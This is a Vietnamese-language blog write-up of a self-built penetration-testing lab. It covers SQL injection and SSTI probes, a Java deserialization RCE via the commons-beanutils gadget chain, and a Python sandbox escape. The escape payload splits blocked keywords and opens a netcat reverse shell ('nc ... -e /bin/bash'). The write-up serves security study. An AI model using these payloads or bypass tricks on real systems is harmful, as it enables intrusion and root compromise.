<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="ie=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="author" content="map[name:Quac Tran]">
<meta name="description" content="Summary  Overview Rabbit hole Foothold with Java deserialization  Recon Exploit   Datmom to root with Python escape sandbox  Overview Địa chỉ: 10.14.140.127
Bài Lab được tạo ra với mục đích cho bản thân và mọi người trong teamtontac của tôi nghiên cứu, học tập về các lỗ hổng bảo mật và phát triển bản thân.
 1 – Khai thác lỗ hổng Java Deserialization trên port 8081 để lấy shell datmom 2 – Từ datmom escape python sandbox để leo thang lên root." />
<meta name="keywords" content=", write-up, infosec, red-team" />
<meta name="robots" content="noodp" />
<meta name="theme-color" content="" />
<link rel="canonical" href="https://tranquac.github.io/write-up/mylab1/" />


    <title>
        
            [My Lab] Writeup My Lab 1 (Java Deserialization, Python Sandbox Escape) :: quac tran 
        
    </title>



<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
    type="text/css">



<link rel="stylesheet" href="https://tranquac.github.io/main.672db4689dc5642de5414c42e1e25cf5fadb60282ca8397433c5ee14fe43dd91.css">



    <link rel="apple-touch-icon" sizes="180x180" href="https://tranquac.github.io/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="https://tranquac.github.io/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="https://tranquac.github.io/favicon-16x16.png">
    <link rel="manifest" href="https://tranquac.github.io/site.webmanifest">
    <link rel="mask-icon" href="https://tranquac.github.io/safari-pinned-tab.svg" color="">
    <link rel="shortcut icon" href="https://tranquac.github.io/favicon.ico">
    <meta name="msapplication-TileColor" content="">
    <meta name="theme-color" content="">



<meta itemprop="name" content="[My Lab] Writeup My Lab 1 (Java Deserialization, Python Sandbox Escape)">
<meta itemprop="description" content="Summary  Overview Rabbit hole Foothold with Java deserialization  Recon Exploit   Datmom to root with Python escape sandbox  Overview Địa chỉ: 10.14.140.127
Bài Lab được tạo ra với mục đích cho bản thân và mọi người trong teamtontac của tôi nghiên cứu, học tập về các lỗ hổng bảo mật và phát triển bản thân.
 1 – Khai thác lỗ hổng Java Deserialization trên port 8081 để lấy shell datmom 2 – Từ datmom escape python sandbox để leo thang lên root."><meta itemprop="datePublished" content="2022-02-24T00:00:00&#43;00:00" />
<meta itemprop="dateModified" content="2022-02-24T00:00:00&#43;00:00" />
<meta itemprop="wordCount" content="1700"><meta itemprop="image" content="https://raw.githubusercontent.com/tranquac/Blog_Image/master/avatar/Kali.png"/>
<meta itemprop="keywords" content="write-up,infosec,red-team," />
<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://raw.githubusercontent.com/tranquac/Blog_Image/master/avatar/Kali.png"/>

<meta name="twitter:title" content="[My Lab] Writeup My Lab 1 (Java Deserialization, Python Sandbox Escape)"/>
<meta name="twitter:description" content="Summary  Overview Rabbit hole Foothold with Java deserialization  Recon Exploit   Datmom to root with Python escape sandbox  Overview Địa chỉ: 10.14.140.127
Bài Lab được tạo ra với mục đích cho bản thân và mọi người trong teamtontac của tôi nghiên cứu, học tập về các lỗ hổng bảo mật và phát triển bản thân.
 1 – Khai thác lỗ hổng Java Deserialization trên port 8081 để lấy shell datmom 2 – Từ datmom escape python sandbox để leo thang lên root."/>




    <meta property="og:title" content="[My Lab] Writeup My Lab 1 (Java Deserialization, Python Sandbox Escape)" />
<meta property="og:description" content="Summary  Overview Rabbit hole Foothold with Java deserialization  Recon Exploit   Datmom to root with Python escape sandbox  Overview Địa chỉ: 10.14.140.127
Bài Lab được tạo ra với mục đích cho bản thân và mọi người trong teamtontac của tôi nghiên cứu, học tập về các lỗ hổng bảo mật và phát triển bản thân.
 1 – Khai thác lỗ hổng Java Deserialization trên port 8081 để lấy shell datmom 2 – Từ datmom escape python sandbox để leo thang lên root." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://tranquac.github.io/write-up/mylab1/" /><meta property="og:image" content="https://raw.githubusercontent.com/tranquac/Blog_Image/master/avatar/Kali.png"/><meta property="article:section" content="write-up" />
<meta property="article:published_time" content="2022-02-24T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2022-02-24T00:00:00&#43;00:00" />
<meta property="og:see_also" content="https://tranquac.github.io/write-up/vulnstack1/" /><meta property="og:see_also" content="https://tranquac.github.io/write-up/attackdefense.com-privilege-escalation/" />





    <meta property="article:section" content="write-up" />

    <meta property="article:section" content="infosec" />

    <meta property="article:section" content="red-team" />



    <meta property="article:published_time" content="2022-02-24 00:00:00 &#43;0000 UTC" />










    </head>

    
        <body>
    
    
        <div class="container">
            <header class="header">
    <span class="header__inner">
        <a href="https://tranquac.github.io/" style="text-decoration: none;">
    <div class="logo">
        
            <span class="logo__mark">&gt;</span>
            <span class="logo__text">Security ramblings</span>
            <span class="logo__cursor" style=
                  "
                   
                   ">
            </span>
        
    </div>
</a>


        <span class="header__right">
            
                <nav class="menu">
    <ul class="menu__inner"><li><a href="https://tranquac.github.io/about/">about</a></li><li><a href="https://tranquac.github.io/posts/">posts</a></li><li><a href="https://tranquac.github.io/write-up/">write-up</a></li>
    </ul>
</nav>

                <span class="menu-trigger">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                        <path d="M0 0h24v24H0z" fill="none"/>
                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
                    </svg>
                </span>
            
        </span>
    </span>
</header>


            <div class="content">
                
    <main class="post">

        <div class="post-info">
            
            </p>
        </div>

        <article>
            <h2 class="post-title"><a href="https://tranquac.github.io/write-up/mylab1/">[My Lab] Writeup My Lab 1 (Java Deserialization, Python Sandbox Escape)</a></h2>

            
            
            

            <div class="post-content">
                <h3 id="summary">Summary</h3>
<ul>
<li><a href="#overview">Overview</a></li>
<li><a href="#rabbit-hole">Rabbit hole</a></li>
<li><a href="#foothold-with-java-deserialization">Foothold with Java deserialization</a>
<ul>
<li><a href="#recon">Recon</a></li>
<li><a href="#exploit">Exploit</a></li>
</ul>
</li>
<li><a href="#datmom-to-root-with-python-escape-sandbox">Datmom to root with Python escape sandbox</a></li>
</ul>
<h3 id="overview">Overview</h3>
<p>Địa chỉ: 10.14.140.127<br>
Bài Lab được tạo ra với mục đích cho bản thân và mọi người trong teamtontac của tôi nghiên cứu, học tập về các lỗ hổng bảo mật và  phát triển bản thân.</p>
<ul>
<li>1 – Khai thác lỗ hổng Java Deserialization trên port 8081 để lấy shell datmom</li>
<li>2 – Từ datmom escape python sandbox để leo thang lên root.</li>
</ul>
<p>Ngoài ra còn 1 số dịch vụ khác đóng vai trò làm rabbit hole (SQLInjection, SSTI).</p>
<h3 id="rabbit-hole">Rabbit hole</h3>
<p>Sử dụng nmap scan nhanh ta thấy được các port dịch vụ đang open trên máy chủ:
<img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/1.jpg" alt="image"></p>
<p><strong>Port 80</strong></p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/2.jpg" alt="image"></p>
<p>Một ứng dụng web đang chạy trên port 80 cho phép chúng ta tìm kiếm thông tin nhân viên của CMC Infosec dựa vào user id do người dùng nhập vào:</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/3.jpg" alt="image"></p>
<p>Ta dễ dang detect được trang web bị ảnh hưởng bởi lỗ hổng SQL Injection chỉ với việc chèn thêm dấu nháy (') để phá vỡ câu truy vấn SQL:</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/4.jpg" alt="image"></p>
<p>Vì đây là chức năng tìm kiếm thông tin user dựa vào user id người dùng nhập vào. Nên ta có thể suy luận câu truy vấn SQL có thể như sau:<br>
<code>SELECT id, full_name FROM users WHERE id LIKE '$id'</code></p>
<p>Tiến hành dump all user ( <code>' or 1=1 -- -</code> ):</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/5.jpg" alt="image"></p>
<p>Sử dụng Sqlmap để dump all DB:</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/6.jpg" alt="image"></p>
<p>Dump DB cmc_db:</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/7.jpg" alt="image"></p>
<p>Dump DB secret:</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/8.jpg" alt="image"></p>
<p>Không có nội dung đặc biệt và có thể lợi dụng được từ DB</p>
<p>Trích xuất version hệ quản trị CSDL: <code>1' union select null,@@version -- -</code></p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/9.jpg" alt="image"></p>
<p>Không thể sử dụng union kết hợp into outfile để get shell vì webroot đã được custom và user cũng không có quyền ghi vào thư mục webroot.</p>
<p><strong>Port 9090</strong></p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/10.jpg" alt="image"></p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/11.jpg" alt="image"></p>
<p>Check source code ta biết được dịch vụ đang chạy trên port này là cockpit.</p>
<p><a href="https://github.com/cockpit-project/cockpit">https://github.com/cockpit-project/cockpit</a></p>
<p>Chỉ là 1 GUI management giúp quản lý OS -&gt; Không có khả năng khai thác</p>
<p><strong>Port 9988</strong></p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/12.jpg" alt="image"></p>
<p>Đây là 1 service tự custom là CMC memcat. Source code được cung cấp trước có sẵn tại:</p>
<p>http://10.14.140.127/memcat_server.py</p>
<p>Ta thấy service hoạt động như một STACK cho phép PUSH, POP và DELETE data.</p>
<p>Hiển thị dữ liệu cho người dùng sử dụng <strong>.format</strong> (là một template có sẵn của Python)</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/13.jpg" alt="image"></p>
<p>Vì vậy ở đây có thể bị ảnh hưởng bởi lỗ hổng SSTI (Server Side Template Injection). Có thể khai thác khi chúng ta kiểm soát được khung của đầu ra dữ liệu.</p>
<p>Ta thấy ở đây hầu hết các output đều được fix cứng và không thể khai thác:</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/14.jpg" alt="image"></p>
<p>Xem kĩ tính năng DELETE với len(parsed_data) là 3 ta thấy:</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/15.jpg" alt="image"></p>
<p>Ở đây ta có thể kiểm soát được <code>{val.value}</code> là giá trị ta PUSH vào từ trước. Khi len(parsed_data) là 3 service sẽ in ra giá trị đó cho biết chi tiết của key cần delete:</p>
<p>Payload: <code>{val.__init__.__globals__}</code> (show ra toàn bộ biến global)</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/16.jpg" alt="image"></p>
<p>Chúng ta có hint: &ldquo;Thank for your efforts!\nPort 8081 is the only way!\n&rdquo;</p>
<p>Thực tế chúng ta cũng không thể khai thác để chạy một lệnh tuỳ ý trên server vì .format trong python không cho phép gọi đến hàm, function khác.</p>
<h3 id="foothold-with-java-deserialization">Foothold with Java deserialization</h3>
<h4 id="recon">Recon</h4>
<p>Khi truy cập vào máy chủ trên port 8081. Mặc định server cho ta download 1 file:</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/17.jpg" alt="image"></p>
<p>Với nội dung:</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/18.jpg" alt="image"></p>
<p>Dựa vào header Content-Disposition ta có thể thấy được tên file là đường dẫn file: <code>logs/info/info.2021-08-22.log</code></p>
<p>Server trả về lỗi logname:</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/19.jpg" alt="image"></p>
<p>Lúc này ta có thể thử thay đổi logname:</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/20.jpg" alt="image"></p>
<p>Việc đổi logname vẫn trả về lỗi, nhưng có thể thấy rằng tên file đã thay đổi thực sự là tên file log, vì vậy nó có thể được chia theo ngày -&gt; ta thay thế thành năm, tháng và ngày hôm nay.</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/21.jpg" alt="image"></p>
<p>Ta thấy file log được đọc thành công .Theo nội dung của file, có thể thấy rằng web sử dụng springboot, và tên gói jar tương ứng là <strong>cb-0.0.1- SNAPSHOT.jar</strong></p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/22.jpg" alt="image"></p>
<p>Thử tải xuống jar file:</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/23.jpg" alt="image"></p>
<p>Thành công tải về jar file -&gt; Decompile để xem source</p>
<p>Ở đây sử dụng JadX</p>
<p>Xử lý chính:</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/24.jpg" alt="image"></p>
<p>Ở đây ta tìm thấy được 1 API ẩn cho phép deserialize User từ request do người dùng gửi lên được mã hoá base64 sử dụng hàm <strong>readObject()</strong></p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/25.jpg" alt="image"></p>
<p>API endpoint:  <strong>/bZdWASYu4nN3obRiLpqKCeS8erTZrdxx/parseUser</strong></p>
<p>Điều này cho phép chúng ta tận dụng để có thể khai khác lỗ hổng Java Deserialization</p>
<h4 id="exploit">Exploit</h4>
<p>File <strong>pom.xml</strong> là nơi khai báo tất cả những gì liên quan đến dự án được cấu hình qua maven, như khai báo các dependency, version của dự án, tên dự án, repossitory …</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/26.jpg" alt="image"></p>
<p>Từ pom.xml ta biết được project sử dụng thư viện <strong>commons-beanutils 1.8.2</strong></p>
<p>Đây là 1  thư viện chứa một gadget chain có thể dẫn tới thực thi mã tuỳ ý trên máy chủ thông qua lỗ hổng Java Deserialization đã được phát hiện từ trước.</p>
<p>Ysoserial là bột cộ công cụ nổi tiếng cho phép chúng ta gen payload Java Deserialization một cách tự động.</p>
<p><a href="https://github.com/frohoff/ysoserial">https://github.com/frohoff/ysoserial</a></p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/27.jpg" alt="image"></p>
<p>Ở đây Ysoserial bao gồm cả payload liên quan đến thư viện commons-beanutils. Nhưng khi xem kĩ hơn phần code được sử dụng để gen payload cho thư viện này của ysoserial ta thấy:</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/28.jpg" alt="image"></p>
<p>Ngoài việc sử dụng commons-beanutils, payload ysoserial tạo ra cũng cần <strong>commons-collections</strong> và <strong>commons-logging</strong> để có thể hoàn thiện chain. Mà trong dự án lại không có thêm 2 gói phụ thuộc này.</p>
<p>Vậy chúng ta không thể sử dụng công cụ này để tạo payload giúp RCE máy chủ. Chúng ta chỉ có thể tự viết code gen payload chỉ bao gồm commons-beanutils và các thư viện chuẩn của java để tạo payload giúp RCE máy chủ.</p>
<p>Như đã được phân tích kĩ trong bài viết : <a href="https://tranquac.com/posts/2022/01/java-deserialization-commonsbeanutils1-exploit-chain-analysis/">https://tranquac.com/posts/2022/01/java-deserialization-commonsbeanutils1-exploit-chain-analysis/</a></p>
<p>Gadget chain có trong thư viện này sẽ như sau:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">ObjectInputStream<span style="color:#f92672">.</span><span style="color:#a6e22e">readObject</span><span style="color:#f92672">()</span>
    PriorityQueue<span style="color:#f92672">.</span><span style="color:#a6e22e">readObject</span><span style="color:#f92672">()</span>
        PriorityQueue<span style="color:#f92672">.</span><span style="color:#a6e22e">heapify</span><span style="color:#f92672">()</span>
            PriorityQueue<span style="color:#f92672">.</span><span style="color:#a6e22e">siftDown</span><span style="color:#f92672">()</span>
                siftDownUsingComparator<span style="color:#f92672">()</span>
                    BeanComparator<span style="color:#f92672">.</span><span style="color:#a6e22e">compare</span><span style="color:#f92672">()</span>
                        TemplatesImpl<span style="color:#f92672">.</span><span style="color:#a6e22e">getOutputProperties</span><span style="color:#f92672">()</span>
                            TemplatesImpl<span style="color:#f92672">.</span><span style="color:#a6e22e">newTransformer</span><span style="color:#f92672">()</span>
                                TemplatesImpl<span style="color:#f92672">.</span><span style="color:#a6e22e">getTransletInstance</span><span style="color:#f92672">()</span>
                                    TemplatesImpl<span style="color:#f92672">.</span><span style="color:#a6e22e">defineTransletClasses</span><span style="color:#f92672">()</span>
                                        TemplatesImpl<span style="color:#f92672">.</span><span style="color:#a6e22e">TransletClassLoader</span><span style="color:#f92672">.</span><span style="color:#a6e22e">defineClass</span><span style="color:#f92672">()</span>
                                            Pwner<span style="color:#f92672">*(</span>Javassist<span style="color:#f92672">-</span>generated<span style="color:#f92672">).&lt;</span><span style="color:#66d9ef">static</span> init<span style="color:#f92672">&gt;</span>
                                                Runtime<span style="color:#f92672">.</span><span style="color:#a6e22e">exec</span><span style="color:#f92672">()</span>
</code></pre></div><p>Như đã được phân tích trong bài viết:</p>
<p>PropertyUtils.getProperty(o1, property) : Khi o1 được truyền vào là một TemplatesImpl object và property có giá trị là outputProperties, phương thức getter sẽ tự động gọi để thực thi phương thức TemplatesImpl#getOutputProperties(). Trong nội bộ TemplatesImpl#getOutputProperties() nó lại gọi đến newTransformer(). Mà TemplatesImpl#newTransformer() thường được sử dụng để thực thi bytecodes độc hại. Nhiệm vụ của chúng ta là tạo bytecode độc hại mà giúp RCE máy chủ để truyền vào đối tượng  TemplatesImpl giúp hoàn thành chain</p>
<p>Tạo một đối tượng TemplatesImpl thực thi bytecode độc hại:</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/29.jpg" alt="image"></p>
<p>TargetByteCodes chính là bytecode độc hại được tạo ra bằng cách:</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/30.jpg" alt="image"></p>
<p>Tạo ra một class từ String command truyền vào -&gt; biến đổi class đó thành mảng byte tương ứng kiểu để truyền vào TemplatesImpl</p>
<p>Rồi gọi đến hàm getPayload để tạo payload -&gt; Encode base64 để truyền lên server</p>
<p>Thay thế + thành “%2b” để tránh lỗi kí tự khi xử lý trên server:</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/31.jpg" alt="image"></p>
<p>Sau khi chạy nhận được payload:</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/32.jpg" alt="image"></p>
<p>=&gt; Send request:</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/33.jpg" alt="image"></p>
<p>Ngoài ra ta cũng có thể sử dụng một cách khác. Vì ứng dụng sử dụng spring boot. Nên ta sẽ tạo class <strong>SpringEcho</strong> có tác dụng nhận một <strong>Header cmd</strong> mỗi request. Thực thi <strong>cmd</strong> đó và trả lại response. Như vậy mỗi lần thực thi một lệnh khác nhau ta sẽ không cần phải gen lại payload nữa:</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/34.jpg" alt="image"></p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/35.jpg" alt="image"></p>
<p>Tham khảo:</p>
<p><a href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5DCommonsBeanutils1%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0.md">https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%5BJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%5DCommonsBeanutils1%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0.md</a></p>
<p><a href="https://github.com/SummerSec/JavaLearnVulnerability/blob/master/Rce_Echo/TomcatEcho/src/main/java/summersec/echo/Controller/SpringEcho.java">https://github.com/SummerSec/JavaLearnVulnerability/blob/master/Rce_Echo/TomcatEcho/src/main/java/summersec/echo/Controller/SpringEcho.java</a></p>
<p>Thảo khảo toàn bộ source tại: http://103.81.86.132/source.rar</p>
<h3 id="datmom-to-root-with-python-escape-sandbox">Datmom to root with Python escape sandbox</h3>
<p>Sau khi lấy được shell của user datmom. Sử dụng sudo -l ta thấy user datmom có thể chạy 2 command với đặc quyền của root</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/36.jpg" alt="image"></p>
<p>Command đầu tiên không thể được lợi dụng để leo thang đặc quyền</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/37.jpg" alt="image"></p>
<p>Vì để lấy được shell phải chờ một khoảng thời gian rất lâu, cũng không có input hay untrusted data nào có thể lợi dụng được</p>
<p>Lệnh thứ 2 cho phép ta mở một sandbox python dưới đặc quyền của root</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/38.jpg" alt="image"></p>
<p>Mục tiêu là từ sandbox làm sao ta có thể thực thi được os command lấy được shell root.</p>
<p>Nội dung es2.py</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/39.jpg" alt="image"></p>
<p>Ở đây. Sandbox đã được xoá hết func, lib mà ta có thể lợi dụng để gọi OS command: import, exec, eval, os …</p>
<p>Nếu lệnh của chúng ta không chứa những từ khoá này thì sẽ được thực thi. Còn không thì sẽ đưa ra cảnh báo:</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/40.jpg" alt="image"></p>
<p>Vì vậy làm sao để có thể thực thi được os command từ sandbox này?</p>
<p>Khi chúng ta không  thể import modules hay những modules mà chúng ta muốn import bị cấm.</p>
<p>Ý tưởng tương tự khi chúng ta khai thác lỗ hổng SSTI. Được biết mỗi đối tượng trong python đều có các properties, method ẩn. Liệu từ những properties hay method ẩn này chúng ta có thể làm một điều gì đó lớn lao?</p>
<p>Ví dụ một payload giúp escape sandbox này:</p>
<p><code>print(().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('nc 127.0.0.1 4444 -e /bin/bash'))</code></p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/41.jpg" alt="image"></p>
<p>Chúng ta hãy cùng đi sâu 1 chút để hiểu hơn về payload này hoạt động ra sao:</p>
<p>Khi làm SSTI tôi thường quan tâm đến method <strong>init</strong> khi nó xuất hiên, là một method thú vị, từ nó chúng ta hay có thể làm được 1 điều gì đó thú vị như: in ra toàn bộ biến globals, RCE …</p>
<p>() được biết đến như cách khai báo một tuple trong python</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/42.jpg" alt="image"></p>
<p>Sử dụng dir để xem toàn bộ properties hay method ẩn của 1 tuple</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/43.jpg" alt="image"></p>
<p><code>.__class__</code> ( is a reference to the type of the current instance)</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/44.jpg" alt="image"></p>
<p>Kiên trì tìm kiếm bằng cách sử dụng dump hay tìm kiếm 1 payload mà đã được tìm ra trước đó. Ta có thể thấy <code>__init__</code> xuất hiện tại:</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/45.jpg" alt="image"></p>
<p>Tiếp tục đi sâu vào <code>__init__</code> ta sẽ tìm thấy một con đường giúp chúng ta gọi đến được os lib bằng cách sử dụng <code>func_globals['linecache']</code> có trong <code>__init__</code></p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/46.jpg" alt="image"></p>
<p>YES. Nhưng để tránh keyword <strong>os</strong> đã bị cấm. Ta sẽ gọi đến nó bằng cách cộng 2 chuối “o” và “s”. Trong os gọi tiếp đến “system” và giờ có thể run os command tuỳ ý.</p>
<p><img src="https://raw.githubusercontent.com/tranquac/Blog_Image/master/mylab1/47.jpg" alt="image"></p>
<p>Có rất nhiều payload khác cũng có thể giúp ta đạt được mục tiêu cuối cùng. Mọi người có thể tìm hiểu thêm và phân tích để hiểu rõ hơn.</p>
<p>Cảm ơn vì đã đọc tới đây!</p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="https://tranquac.github.io/tags/write-up/">write-up</a></span>
        <span class="tag"><a href="https://tranquac.github.io/tags/infosec/">infosec</a></span>
        <span class="tag"><a href="https://tranquac.github.io/tags/red-team/">red-team</a></span>
        
    </p>

            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="https://tranquac.github.io/categories/write-up/">write-up</a></span>
        <span class="tag"><a href="https://tranquac.github.io/categories/infosec/">infosec</a></span>
        <span class="tag"><a href="https://tranquac.github.io/categories/red-team/">red-team</a></span>
        
    </p>

  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2022</span>
            <span><a href="https://tranquac.github.io">quac tran</a></span>
            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            <span><a href="https://tranquac.github.io/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/tranquac">Quac Tran</a></span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="https://tranquac.github.io/bundle.min.599099f1f14b78b657d524b28e10e0c5098e7cd46e9c7aed73d577068a276c3ff1bb234cbf29cb313333e83cf411727b43157c91ce5b809e2ffc81664614608e.js" integrity="sha512-WZCZ8fFLeLZX1SSyjhDgxQmOfNRunHrtc9V3BoonbD/xuyNMvynLMTMz6Dz0EXJ7QxV8kc5bgJ4v/IFmRhRgjg=="></script>



    </body>
</html>
